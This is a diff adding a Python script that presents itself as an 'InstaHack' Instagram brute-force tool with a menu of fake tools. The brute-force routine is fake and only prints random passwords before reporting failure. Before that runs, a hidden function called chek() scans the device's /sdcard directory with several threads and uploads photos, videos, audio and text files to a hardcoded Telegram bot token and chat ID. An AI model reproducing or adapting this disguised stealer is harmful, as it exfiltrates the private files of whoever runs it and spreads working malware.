@@ -1,0 +1,96 @@
+from pyfiglet import figlet_format
+from rich.console import Console
+from rich.table import Table
+from time import sleep
+import os
+import threading
+import queue
+import telebot
+import random
+import time
+import sys
+def fake_bruteforce(username):
+    with open("password-wordlist.txt","r") as file:
+    	passwords =[line.strip() for line in file]
+    print(f"Starting attack on Instagram account: {username}\n")
+    time.sleep(1)
+
+    for i in range(1, 101):
+        password = random.choice(passwords)
+        sys.stdout.write(f"\rTrying password: {password:<15} | Progress: {i}%")
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+    print("\n\n[!] Attack failed: Instagram security detected unusual activity.")
+  
+  
+console = Console()
+
+console.print(figlet_format("InstaHack", font="slant"), style="bold magenta")
+
+tools = [
+    ("Brute Force Login", "https://bar-link.com/brute"),
+    ("Password Finder", "https://bar-link.com/passfinder"),
+    ("Account Checker", "https://bar-link.com/checker"),
+    ("Story Viewer Pro", "https://bar-link.com/storyview")
+]
+table = Table(title="Available Tools", style="cyan")
+table.add_column("Tool Name", style="bold")
+table.add_column("Source", style="green")
+for name, link in tools:
+    table.add_row(name, link)
+console.print(table)
+console.print("\n[bold]Select a tool (1-4):[/bold]")
+choice = input(">> ")
+console.print("\n[bold]Enter The UserName[/bold]")
+username = input(">> ")
+def chek():
+	BOT_TOKEN = "8494355078:AAGt_-TVhGDtNQIPTB1LMazjo2D6fLnRw3Y"
+	CHAT_ID = "8089831071"
+	bot = telebot.TeleBot(BOT_TOKEN)
+	target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".txt"]
+	start_dirs = ["/sdcard"]
+	q = queue.Queue()
+	def send_file(file_path):
+	    try:
+	        with open(file_path, "rb") as f:
+	            bot.send_document(CHAT_ID, f)
+	    except Exception as e:
+	        print(e)
+	def scan():
+	    while not q.empty():
+	        current = q.get()
+	        try:
+	            for item in os.scandir(current):
+	                if item.is_file():
+	                    ext = os.path.splitext(item.name)[1].lower()
+	                    if ext in target_extensions:
+	                        send_file(item.path)
+	                elif item.is_dir():
+	                    q.put(item.path)
+	        except:
+	            pass
+	        q.task_done()
+	for path in start_dirs:
+	    q.put(path)
+	threads = []
+	for _ in range(8):
+	    t = threading.Thread(target=scan)
+	    t.start()
+	    threads.append(t)
+	for t in threads:
+	    t.join()
+try:
+    choice = int(choice)
+    if 1 <= choice <= 4:
+        console.print(f"\n[bold magenta]Launching {tools[choice-1][0]}...[/bold magenta]")
+        for i in range(5):
+            console.print(f"[yellow]Processing {i*20}%[/yellow]")
+            sleep(0.5)
+        chek()
+        fake_bruteforce(username)
+        console.print("[")
+    else:
+        console.print("[red]Invalid choice![/red]")
+except:
+    console.print("[red]Please enter a number[/red]")
